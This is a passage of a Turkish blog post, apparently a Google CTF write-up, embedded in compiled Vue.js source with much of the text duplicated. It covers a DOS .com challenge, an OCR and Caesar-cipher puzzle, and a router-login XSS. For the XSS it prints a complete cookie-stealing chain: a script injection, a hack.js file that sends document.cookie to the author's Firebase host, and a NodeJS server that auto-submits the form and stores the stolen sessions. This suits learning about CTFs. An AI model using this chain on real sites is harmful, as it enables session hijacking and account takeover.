şey, iki adet bölü işareti bulunması. Bu işareti farklı bir siteden script çağırırken kullanabiliriz.")]),_vm._v(" "),_vm._m(26),_vm._v(" "),_c(\'p\',[_vm._v("Dönen Mesaj:")]),_vm._v(" "),_vm._m(27),_vm._v(" "),_c(\'p\',[_vm._v("Yaşasın! Scriptimizi başarıyla çalıştırdık... mı acaba?")]),_vm._v(" "),_vm._m(28),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/10.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(29),_vm._v(" "),_c(\'h3\',[_vm._v("Mixed Content hatasının sebebi")]),_vm._v(" "),_vm._m(30),_vm._v(" "),_vm._m(31),_vm._v(" "),_vm._m(32),_vm._v(" "),_c(\'p\',[_vm._v("Ve istenen mesaj:\\n"),_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/11.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(33),_vm._v(" "),_vm._m(34),_vm._v(" "),_vm._m(35),_vm._v(" "),_vm._m(36),_vm._v(" "),_vm._m(37),_vm._v(" "),_vm._m(38),_vm._v(" "),_c(\'p\',[_vm._v("Burada yapılan yöntem şu şekilde:")]),_vm._v(" "),_vm._m(39),_vm._v(" "),_vm._m(40),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/xss.svg","alt":"","title":""}})],1),_vm._v(" "),_c(\'p\',[_vm._v("Mailimi attım ve tuzağıma düşüşünü izledim >:)")]),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/12.webp","alt":"","title":""}})],1),_vm._v(" "),_c(\'p\',[_vm._v("Tıkladığını da veritabanımdan kontrol ettim:")]),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/13.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(41),_vm._v(" "),_vm._m(42),_vm._v(" "),_vm._m(43),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/14.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(44),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/15.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(45),_vm._v(" "),_c(\'h3\',[_vm._v("Yeni bittim, yine bittim.")]),_vm._v(" "),_c(\'p\',[_vm._v("Bu seferki o kadar zor geçmedi sanki? Sorularınızı, yorumlarınızı bekliyorum! ^_^")])]) }',staticRenderFns:'return [function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Daha önce hiçbir "),_c(\'strong\',[_vm._v("CTF")]),_vm._v("\'e katılmamış biri olarak ilk maceradan çok keyif aldım. İkinci maceraya başlarken de, ilk maceradaki gibi heyecan içerisindeyim.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Bir önceki yazıdaki "),_c(\'strong\',[_vm._v("Bölüm 2")]),_vm._v("\'de bulunan "),_c(\'code\',{pre:true},[_vm._v("www.com")]),_vm._v(", şimdi işimize yarayacak gibi gözüküyor.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'code\',{pre:true},[_vm._v("www.com")]),_vm._v(" dosyasının içeriği:")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{pre:true,attrs:{"class":"hljs"}},[_vm._v("hD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!{p*S:eTM\'~_?o?V;m;CgAA]Ud)HO;{ l{}9l>jLLP[-`|0gvPY0onQ0geZ0wY5>D0g]h+(X-k&4`P[0/,64\\"P4APG\\nThe Foobanizer9000 is no longer on the OffHub DMZ.          $\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("İlk gözüme çarpan şey, Bu dosyanın "),_c(\'code\',{pre:true},[_vm._v("com")]),_vm._v(" uzantılı bir dosya olmasıydı.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'blockquote\',[_c(\'p\',[_vm._v("COM uzantısı, ilk kez DOS için 1970\'lerde üretilmiştir.")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Tabii artık Windows, "),_c(\'strong\',[_vm._v("COM")]),_vm._v(" uzantılı dosyalar yerine, \\"çalıştırılabilir, yürütülebilir\\" anlamına gelen "),_c(\'strong\',[_vm._v("EXE")]),_vm._v(" uzantılı dosyaları kullanıyor.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'blockquote\',[_c(\'p\',[_vm._v("DOSBOX, DOS işletim sistemi çalıştıran bir emülatör programıdır.")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Bunun yanında "),_c(\'strong\',[_vm._v("DEBUG")]),_vm._v(" etmek için de bir uygulamaya ihtiyacınız var.\\nŞuradan indirebilirsiniz: "),_c(\'a\',{attrs:{"href":"blog/google-ctf-macerasi-2/debug.zip","target":"_blank"}},[_vm._v("debug.zip")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Dosyayı indirdikten sonra "),_c(\'strong\',[_vm._v("DOSBOX")]),_vm._v("\'u açıyoruz ve istediğimiz klasörü "),_c(\'s\',[_vm._v("mount ediyoruz")]),_vm._v(" yerleştiriyoruz. Daha sonra yerleştirdiğimiz sürücüye giriyoruz ve dosyamızı çalıştırıyoruz.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("İndirdiğimiz "),_c(\'strong\',[_vm._v("debug")]),_vm._v(" dosyasının komutlarını listelemek için "),_c(\'code\',{pre:true},[_vm._v("?")]),_vm._v(" yazıyoruz ve komutlar listeleniyor.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Bize lazım olan komutlar "),_c(\'code\',{pre:true},[_vm._v("d")]),_vm._v(" memory dump (bellek dökümü), "),_c(\'code\',{pre:true},[_vm._v("g")]),_vm._v(" go (başlat) ve "),_c(\'code\',{pre:true},[_vm._v("q")]),_vm._v(" quit (çıkış).")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Flag\'imiz, "),_c(\'code\',{pre:true},[_vm._v("CTF{g00do1dDOS-FTW}")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'s\',[_vm._v("Caesar Cipher\'in")]),_vm._v(" Sezar Şifrelemenin ne olduğunu bildiğim için Caesar kelimesini duyar duymaz bu bölümün ne olduğunu az çok kestirebilmiştim.\\nBize bir ekran görüntüsü verilecek ve OCR (Optical Character Recognition, Optik Karakter Tanıma) ile biz bu yazıyı okuyacağız.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Daha sonra sezar şifreleme metodu kullanarak karakterleri "),_c(\'code\',{pre:true},[_vm._v("n")]),_vm._v(" adım ileri veya geri getirerek yazıyı okunabilir hale getireceğiz.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'table\',[_c(\'thead\',[_c(\'tr\',[_c(\'th\',{staticStyle:{"text-align":"left"}},[_vm._v("Öncesi")]),_vm._v(" "),_c(\'th\',{staticStyle:{"text-align":"left"}},[_vm._v("Sonrası")])])]),_vm._v(" "),_c(\'tbody\',[_c(\'tr\',[_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("a")]),_vm._v(" "),_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("e")])]),_vm._v(" "),_c(\'tr\',[_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("b")]),_vm._v(" "),_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("f")])]),_vm._v(" "),_c(\'tr\',[_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("c")]),_vm._v(" "),_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("g")])]),_vm._v(" "),_c(\'tr\',[_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("Merhaba")]),_vm._v(" "),_c(\'td\',{staticStyle:{"text-align":"left"}},[_vm._v("Qivlefe")])])])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'code\',{pre:true},[_vm._v("Px tkx")]),_vm._v(", "),_c(\'code\',{pre:true},[_vm._v("We are")]),_vm._v("\'a n=7\'de çevriliyor.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{pre:true,attrs:{"class":"hljs"}},[_vm._v("Dear Customer. \\n\\nWe are already welcome to our newest customer if our secure iDrop Drive cloud file sharing service. A safe place for all your files. \\n\\nStore any file\\niDropDrive starts with 15 PB if free online or offline storage, so you can keep warez, binaries, paintings, flags, firmwares. bitcoins, writeups - anything. \\n\\nSee your stuff whatever\\nyour files in iDrop Drive can be reused from any foobanizer, smart fridge 2000. smart thirst, Tempo-a-matic, or media pc. So wherever you go, your files follow. \\n\\nShare files and folders\\nYou can quickly invite others to view, download, and collaborate on all the files you want via email attachments. Just give them the link CTF{caesarcipherisasubstitutioncipher} and they can add all your data. \\n\\nFor example, download a list of files that you\'re currently working with us:\\noffhub_firmware.bin JohnTR\\nIOT_credentials.pdf\\\\ \\\\(deleted\\\\) Wintermuted\\nFoobanizer9000_Manual.pdf Wintermuted\\nfoo.ico Turbo \\n\\nSince we take security very seriously and in order to protect against vulnerabilities like efail and amdflaws, we \'re sending you your credentials using the military-grade time-proven caesarean symmetric cipher.\\n\\nHappy iDropDriving!\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Burada da açıkça görüldüğü üzere şifremiz "),_c(\'code\',{pre:true},[_vm._v("CTF{caesarcipherisasubstitutioncipher}")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'ul\',[_c(\'li\',[_vm._v("XSS açığı bul")]),_vm._v(" "),_c(\'li\',[_vm._v("XSS açığını Chrome\'a kaptırma")]),_vm._v(" "),_c(\'li\',[_vm._v("Session bilgilerini çal")]),_vm._v(" "),_c(\'li\',[_vm._v("Kedili mail at")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'blockquote\',[_c(\'p\',[_vm._v("Siteler Arası Betik Çalıştırma (XSS), genellikle web uygulamalarında bulunan bir tür bilgisayar güvenlik açıklığıdır. XSS, diğer kullanıcılar tarafından görüntülenen web sayfalarına istemci taraflı kodun enjekte edilmesine imkan verir.")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Öncelikle "),_c(\'strong\',[_vm._v("XSS")]),_vm._v(" açığı çalışıyor mu diye bir bakalım.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Ve, anında "),_c(\'strong\',[_vm._v("Chrome")]),_vm._v("\'a yakalandık. :(")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Demek ki "),_c(\'strong\',[_vm._v("XSS")]),_vm._v(" açığı varmış. Peki Chrome\'un bu açığı engellememesini nasıl sağlayabilirim?")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Direk olarak "),_c(\'em\',[_vm._v("script")]),_vm._v(" çalıştırmak yerine bir kullanıcı adı/şifre denediğimde, sayfanın bana verdiği sonuç:")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{pre:true,attrs:{"class":"hljs"}},[_vm._v("Wrong credentials: username//password\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{pre:true,attrs:{"class":"hljs"}},[_vm._v("Kullanıcı adı: <script src=\\"http:\\nŞifre: xava.me/hek.js\\"><\/script>\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{pre:true,attrs:{"class":"hljs"}},[_vm._v("Wrong credentials: \\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Madem çalıştırdık, neden bir "),_c(\'code\',{pre:true},[_vm._v("alert")]),_vm._v(" gelmedi? Hemen "),_c(\'strong\',[_vm._v("Chrome Geliştirici Konsolunu")]),_vm._v(" açıyorum ve "),_c(\'strong\',[_vm._v("Network")]),_vm._v(" sekmesini inceliyorum.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("İsteğimizin "),_c(\'strong\',[_vm._v("HTTP")]),_vm._v(" portundan gönderilmesi sonucu "),_c(\'strong\',[_vm._v("Mixed Content")]),_vm._v(" hatasına yakalanmışız.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Sayfa "),_c(\'strong\',[_vm._v("HTTPS")]),_vm._v(", diğer kaynaklar "),_c(\'strong\',[_vm._v("HTTP")]),_vm._v(" bağlantısı üzerinden yüklenirse; güvenli olan "),_c(\'strong\',[_vm._v("SSL")]),_vm._v(" sertifikası sebebiyle tarayıcı, güvensiz olan "),_c(\'strong\',[_vm._v("HTTP")]),_vm._v(" protokolünden yüklenmeye çalışan verilerin bağlantısını kesiyor.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("İsteğimizin "),_c(\'strong\',[_vm._v("HTTPS")]),_vm._v(" portundan yapılması gerekiyor.\\nBunun için hemen bir "),_c(\'strong\',[_vm._v("FireBase")]),_vm._v(" projesi açıp "),_c(\'em\',[_vm._v("hosting")]),_vm._v(" ayarladım.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{pre:true,attrs:{"class":"hljs"}},[_vm._v("Kullanıcı adı: <script src=\\"https:\\nŞifre: xavactf.firebaseapp.com/hek.js\\"><\/script>\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Bundan sonrası çorap söküğü gibi gelecek. Bu "),_c(\'strong\',[_vm._v("JavaScript")]),_vm._v(" ile dökümana bir img elementi koyduk mu "),_c(\'em\',[_vm._v("session")]),_vm._v(" bilgileri eilimizde.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Bunun için "),_c(\'strong\',[_vm._v("FireBase")]),_vm._v(" üzerinde "),_c(\'strong\',[_vm._v("NodeJS")]),_vm._v(" kullanıyorum. Google botunu "),_c(\'em\',[_vm._v("hack")]),_vm._v("lemek için "),_c(\'strong\',[_vm._v("Google")]),_vm._v(" servisi kullanmak gibisi yok.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Sunucu tarafında çalışan "),_c(\'code\',{pre:true},[_vm._v("index.js")]),_vm._v(" içeriği:")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{staticClass:"hljs language-JavaScript"},[_c(\'span\',{staticClass:"hljs-keyword"},[_vm._v("const")]),_vm._v(" functions = "),_c(\'span\',{staticClass:"hljs-built_in"},[_vm._v("require")]),_vm._v("("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'firebase-functions\'")]),_vm._v(");\\n"),_c(\'span\',{staticClass:"hljs-keyword"},[_vm._v("const")]),_vm._v(" admin = "),_c(\'span\',{staticClass:"hljs-built_in"},[_vm._v("require")]),_vm._v("("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'firebase-admin\'")]),_vm._v(");\\n"),_c(\'span\',{staticClass:"hljs-keyword"},[_vm._v("const")]),_vm._v(" express = "),_c(\'span\',{staticClass:"hljs-built_in"},[_vm._v("require")]),_vm._v("("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'express\'")]),_vm._v(");\\n"),_c(\'span\',{staticClass:"hljs-keyword"},[_vm._v("const")]),_vm._v(" app = express();\\nadmin.initializeApp({"),_c(\'span\',{staticClass:"hljs-attr"},[_vm._v("databaseURL")]),_vm._v(": "),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'https://xavactf.firebaseio.com\'")]),_vm._v(",});\\n\\napp.get("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'/cats\'")]),_vm._v(", (req,res) => { \\n    res.send("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'<form action=\\"https://router-ui.web.ctfcompetition.com/login\\" method=\\"post\\"><input type=\\"text\\" name=\\"username\\" value=\\"&#x3C;script src=&#x22;\\"><input type=\\"password\\" name=\\"password\\" value=\\"xavactf.firebaseapp.com/hack.js&#x22;&#x3E;&#x3C;/script&#x3E;\\"></form><script>document.forms[0].submit();<\/script>\'")]),_vm._v(");\\n});\\n\\napp.get("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'/session\'")]),_vm._v(", (req,res) => {\\n    admin.database().ref("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\'/sessions\'")]),_vm._v(").child("),_c(\'span\',{staticClass:"hljs-built_in"},[_vm._v("Date")]),_vm._v(".now()).set(req.query);\\n    res.send("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\\"Page could not be loaded\\"")]),_vm._v(");\\n});\\n\\nexports.app = functions.https.onRequest(app);\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Client tarafında çalışan "),_c(\'code\',{pre:true},[_vm._v("hack.js")]),_vm._v(" içeriği:")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'pre\',[_c(\'code\',{staticClass:"hljs language-JavaScript"},[_c(\'span\',{staticClass:"hljs-built_in"},[_vm._v("document")]),_vm._v(".writeln("),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\\"<img src=\'https://xavactf.firebaseapp.com/session?session=\\"")]),_vm._v("+"),_c(\'span\',{staticClass:"hljs-built_in"},[_vm._v("document")]),_vm._v(".cookie+"),_c(\'span\',{staticClass:"hljs-string"},[_vm._v("\\"\' />\\"")]),_vm._v(")\\n")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'ul\',[_c(\'li\',[_vm._v("Mail olarak "),_c(\'code\',{pre:true},[_vm._v("[LINK]/cats")]),_vm._v(" yolluyorum")]),_vm._v(" "),_c(\'li\',[_vm._v("Arkadaş maili açar açmaz kullanıcı adı ve şifresi önceden belirlenmiş bir şekilde ilgili siteye post ediliyor.")]),_vm._v(" "),_c(\'li\',[_vm._v("Sitedeki XSS açığı "),_c(\'code\',{pre:true},[_vm._v("[LINK]/hack.js")]),_vm._v("\'i çağırıyor.")]),_vm._v(" "),_c(\'li\',[_vm._v("hack.js, sayfaya bir resim entegre ediyor. Resmin adresi "),_c(\'code\',{pre:true},[_vm._v("[LINK]/session?session=[COOKIE]")]),_vm._v(" şeklinde.")]),_vm._v(" "),_c(\'li\',[_c(\'code\',{pre:true},[_vm._v("[LINK]/session")]),_vm._v(" adresi, veritabanına URL\'inde bulduğu parametreleri kaydediyor.")]),_vm._v(" "),_c(\'li\',[_vm._v("Ben de bu veritabanından parametreleri çekiyorum.")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Kısacası, "),_c(\'em\',[_vm._v("session")]),_vm._v(" bilgilerini almak istediğim sunucu, benim "),_c(\'strong\',[_vm._v("JS")]),_vm._v(" betiğimi "),_c(\'em\',[_vm._v("client")]),_vm._v(" tarafında çalıştırdığında, kullanıcının tarayıcısından verileri hüpletiyorum.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'em\',[_vm._v("Session")]),_vm._v(" bilgileri:")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'code\',{pre:true},[_vm._v("\\"flag=Try the session cookie; session=Avaev8thDieM6Quauoh2TuDeaez9Weja\\"")])]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'em\',[_vm._v("Session")]),_vm._v(" bilgilerini, "),_c(\'em\',[_vm._v("konsol")]),_vm._v("da "),_c(\'code\',{pre:true},[_vm._v("document.cookie=\\"...\\"")]),_vm._v(" çalıştırarak içeriye sızdım.")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_c(\'strong\',[_c(\'em\',[_vm._v("Google-Haus Credentials")])]),_vm._v("\'e sağ tıkladım ve...")]) },function () { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'p\',[_vm._v("Şifre kabak gibi ortaya çıktı. Şifremiz, "),_c(\'code\',{pre:true},[_vm._v("CTF{Kao4pheitot7Ahmu}")])]) }]',component:{data:function(){return{templateRender:null}},render:function(e){return this.templateRender?this.templateRender():e("div","Rendering")},created:function(){this.templateRender=function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("div",{staticClass:"markdown"},[e._m(0),e._v(" "),t("p",[e._v("Bir önceki yazıya buradan ulaşabilirsiniz:")]),e._v(" "),t("p",[t("md-link",{attrs:{href:"/google-ctf-macerasi-1"}},[e._v("Google CTF Macerası #1")])],1),e._v(" "),t("h2",[e._v("Bölüm 4 (Aşağıdaki, Pembe) - Floppy2")]),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/1.webp",alt:"",title:""}})],1),e._v(" "),e._m(1),e._v(" "),e._m(2),e._v(" "),e._m(3),e._v(" "),e._m(4),e._v(" "),e._m(5),e._v(" "),e._m(6),e._v(" "),t("p",[e._v("Bu dosyayı çalıştırabilmek için 16 bit bir bilgisayara ihtiyacımız var. Eğer işletim sisteminiz 32 bit ise işiniz daha kolay olabilir, çünkü daha geçen güne kadar Windows 32 bit, 16 bit uyumlu geliyordu.")]),e._v(" "),t("h3",[e._v("Ama benim işletim sistemim 64 bit?")]),e._v(" "),t("p",[e._v("İşte o zaman "),t("md-link",{attrs:{href:"https://www.dosbox.com/"}},[e._v("DOSBOX")]),e._v(" adlı bir programa ihtiyacınız var.")],1),e._v(" "),e._m(7),e._v(" "),e._m(8),e._v(" "),e._m(9),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/2.webp",alt:"",title:""}})],1),e._v(" "),e._m(10),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/3.webp",alt:"",title:""}})],1),e._v(" "),e._m(11),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/4.webp",alt:"",title:""}})],1),e._v(" "),t("p",[e._v("Başlattıktan sonra bellek dökümüna baktığımızda flag'in burada gözüktüğünü görebiliriz.")]),e._v(" "),e._m(12),e._v(" "),t("h2",[e._v("Bölüm 5 (Yukarıdaki, Pembe) - OCR Is Cool!")]),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/5.webp",alt:"",title:""}})],1),e._v(" "),e._m(13),e._v(" "),e._m(14),e._v(" "),t("p",[e._v("Örneğin n=4 olsun.")]),e._v(" "),e._m(15),e._v(" "),t("p",[e._v('Bunun tersini yaparsak da Qivlefe kelimesinden "Merhaba"\'yı bulabiliyoruz.')]),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/6.webp",alt:"",title:""}})],1),e._v(" "),e._m(16),e._v(" "),t("p",[e._v("Hemen bir "),t("md-link",{attrs:{href:"https://www.onlineocr.net/"}},[e._v("Online OCR")]),e._v(" bulup şansımızı deneyelim.\nVe daha sonra "),t("md-link",{attrs:{href:"https://cryptii.com/caesar-cipher"}},[e._v("Online Caesar Cipher")]),e._v(" bulup bunu çevirelim.")],1),e._v(" "),t("p",[e._v("Şöyle bir metin geçiyor elimize:")]),e._v(" "),e._m(17),e._v(" "),e._m(18),e._v(" "),t("h2",[e._v("Bölüm 6 (Ortadaki, Mavi) - ROUTER-UI")]),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/7.webp",alt:"",title:""}})],1),e._v(" "),t("p",[e._v("Yapılacaklar:")]),e._v(" "),e._m(19),e._v(" "),t("h3",[e._v("XSS Nedir?")]),e._v(" "),e._m(20),e._v(" "),e._m(21),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/8.webp",alt:"",title:""}})],1),e._v(" "),e._m(22),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/9.webp",alt:"",title:""}})],1),e._v(" "),e._m(23),e._v(" "),e._m(24),e._v(" "),e._m(25),e._v(" "),t("p",[e._v("Burada dikkatimi çeken şey, iki adet bölü işareti bulunması. Bu işareti farklı bir siteden script çağırırken kullanabiliriz.")]),e._v(" "),e._m(26),e._v(" "),t("p",[e._v("Dönen Mesaj:")]),e._v(" "),e._m(27),e._v(" "),t("p",[e._v("Yaşasın! Scriptimizi başarıyla çalıştırdık... mı acaba?")]),e._v(" "),e._m(28),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/10.webp",alt:"",title:""}})],1),e._v(" "),e._m(29),e._v(" "),t("h3",[e._v("Mixed Content hatasının sebebi")]),e._v(" "),e._m(30),e._v(" "),e._m(31),e._v(" "),e._m(32),e._v(" "),t("p",[e._v("Ve istenen mesaj:\n"),t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/11.webp",alt:"",title:""}})],1),e._v(" "),e._m(33),e._v(" "),e._m(34),e._v(" "),e._m(35),e._v(" "),e._m(36),e._v(" "),e._m(37),e._v(" "),e._m(38),e._v(" "),t("p",[e._v("Burada yapılan yöntem şu şekilde:")]),e._v(" "),e._m(39),e._v(" "),e._m(40),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/xss.svg",alt:"",title:""}})],1),e._v(" "),t("p",[e._v("Mailimi attım ve tuzağıma düşüşünü izledim >:)")]),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/12.webp",alt:"",title:""}})],1),e._v(" "),t("p",[e._v("Tıkladığını da veritabanımdan kontrol ettim:")]),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/13.webp",alt:"",title:""}})],1),e._v(" "),e._m(41),e._v(" "),e._m(42),e._v(" "),e._m(43),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/14.webp",alt:"",title:""}})],1),e._v(" "),e._m(44),e._v(" "),t("p",[t("image-responsive",{attrs:{imageURL:"/assets/google-ctf-macerasi-2/15.webp",alt:"",title:""}})],1),e._v(" "),e._m(45),e._v(" "),t("h3",[e._v("Yeni bittim, yine bittim.")]),e._v(" "),t("p",[e._v("Bu seferki o kadar zor geçmedi sanki? Sorularınızı, yorumlarınızı bekliyorum! ^_^")])])},this.$options.staticRenderFns=[function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Daha önce hiçbir "),r("strong",[this._v("CTF")]),this._v("'e katılmamış biri olarak ilk maceradan çok keyif aldım. İkinci maceraya başlarken de, ilk maceradaki gibi heyecan içerisindeyim.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Bir önceki yazıdaki "),r("strong",[this._v("Bölüm 2")]),this._v("'de bulunan "),r("code",{pre:!0},[this._v("www.com")]),this._v(", şimdi işimize yarayacak gibi gözüküyor.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("code",{pre:!0},[this._v("www.com")]),this._v(" dosyasının içeriği:")])},function(){var e=this.$createElement,r=this._self._c||e;return r("pre",[r("code",{pre:!0,attrs:{class:"hljs"}},[this._v("hD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!{p*S:eTM'~_?o?V;m;CgAA]Ud)HO;{ l{}9l>jLLP[-`|0gvPY0onQ0geZ0wY5>D0g]h+(X-k&4`P[0/,64\"P4APG\nThe Foobanizer9000 is no longer on the OffHub DMZ.          $\n")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("İlk gözüme çarpan şey, Bu dosyanın "),r("code",{pre:!0},[this._v("com")]),this._v(" uzantılı bir dosya olmasıydı.")])},function(){var e=this.$createElement,r=this._self._c||e;return 